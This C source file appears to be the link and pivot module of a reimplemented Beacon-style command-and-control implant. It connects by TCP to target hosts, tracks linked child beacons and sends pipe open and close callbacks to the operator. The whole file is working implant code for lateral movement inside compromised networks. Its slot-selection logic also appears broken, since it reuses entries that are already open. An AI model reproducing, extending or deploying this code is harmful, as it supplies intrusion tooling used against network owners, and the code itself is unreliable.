#include "pch.h"

#include "link.h"

#include "beacon.h"
#include "network.h"
#include "protocol.h"

typedef struct _LINK_ENTRY
{
	int bid;
	PROTOCOL protocol;
	BOOL isOpen;
	char* callbackData;
	int callbackLength;
	int lastPingTime;
} LINK_ENTRY;

#define MAX_LINKS 28
LINK_ENTRY gLinks[MAX_LINKS] = { 0 };

BOOL LinkAdd(PROTOCOL* protocol, int flags)
{
	char buffer[256] = { 0 };
	if (!protocol->waitForData(protocol, 30000, 10))
		return FALSE;

	int read = protocol->read(protocol, buffer, sizeof(buffer));
	if (read < 0)
		return FALSE;

	datap parser;
	BeaconDataParse(&parser, buffer, read);
	int bid = BeaconDataInt(&parser);
	LINK_ENTRY* openLink = NULL;
	for(int i = 0; i < MAX_LINKS; i++)
	{
		if (gLinks[i].isOpen)
		{
			openLink = &gLinks[i];
			break;
		}
	}

	if (!openLink)
	{
		LERROR("Maximum links reached. Disconnect one");
		BeaconErrorNA(ERROR_MAXIMUM_LINKS_REACHED);
		return FALSE;
	}

	openLink->bid = bid;
	openLink->protocol = *protocol;
	openLink->isOpen = TRUE;

#define MAX_CALLBACK_DATA 0x100
	if ( openLink->callbackData == NULL )
	{
		openLink->callbackData = malloc(MAX_CALLBACK_DATA);

		if (openLink->callbackData == NULL)
			return FALSE;
	}

	formatp format;
	BeaconFormatUse(&format, openLink->callbackData, MAX_CALLBACK_DATA);
	BeaconFormatInt(&format, bid);
	BeaconFormatInt(&format, flags);

	char* buf = BeaconDataBuffer(&parser);
	BeaconFormatAppend(&format, buf, read - sizeof(int));

	openLink->callbackLength = BeaconDataLength(&format);
	BeaconOutput(CALLBACK_PIPE_OPEN, openLink->callbackData, openLink->callbackLength);

	return TRUE;
}

SOCKET LinkViaTcpConnect(char* target, short port)
{
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	if (sock == INVALID_SOCKET)
		return INVALID_SOCKET;

	// Get host by name
	struct hostent* host = gethostbyname(target);
	if (host == NULL)
	{
		closesocket(sock);
		return INVALID_SOCKET;
	}

	struct sockaddr_in addr;
	memcpy(&addr.sin_addr, host->h_addr, host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		closesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}

#define PIVOT_HINT_REVERSE 0x10000
#define PIVOT_HINT_FORWARD 0
#define PIVOT_HINT_PROTO_PIPE 0
#define PIVOT_HINT_PROTO_TCP 0x100000

void LinkViaTcp(char* buffer, int length)
{
	int timeout = GetTickCount() + 15000;

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);
	char* target = BeaconDataBuffer(&parser);
	NetworkInit();

	while(GetTickCount() < timeout)
	{
		SOCKET sock = LinkViaTcpConnect(target, port);
		if (sock != INVALID_SOCKET)
		{
			PROTOCOL protocol;
			ProtocolTcpInit(&protocol, sock);
			LinkAdd(&protocol, port | PIVOT_HINT_PROTO_TCP);
			return;
		}

		Sleep(1000);
	}

	DWORD error = WSAGetLastError();
	BeaconErrorD(ERROR_CONNECT_TO_TARGET_FAILED, error);	
}

void PipeReopen(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int bid = BeaconDataInt(&parser);
	for (int i = 0; i < MAX_LINKS; i++)
	{
		if (gLinks[i].isOpen == TRUE && gLinks[i].bid == bid)
		{
			BeaconOutput(CALLBACK_PIPE_OPEN, gLinks[i].callbackData, gLinks[i].callbackLength);
			break;
		}
	}
}

void PipeCloseInternal(int bid)
{
	for (int i = 0; i < MAX_LINKS; i++)
	{
		if (gLinks[i].isOpen == TRUE && gLinks[i].bid == bid)
		{
			bid = htonl(bid);
			BeaconOutput(CALLBACK_PIPE_CLOSE, (char*)&bid, sizeof(int));
			gLinks[i].bid = 0;
			gLinks[i].isOpen = FALSE;
			gLinks[i].lastPingTime = 0;
			break;
		}
	}
}

void PipeClose(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int bid = BeaconDataInt(&parser);
	PipeCloseInternal(bid);
}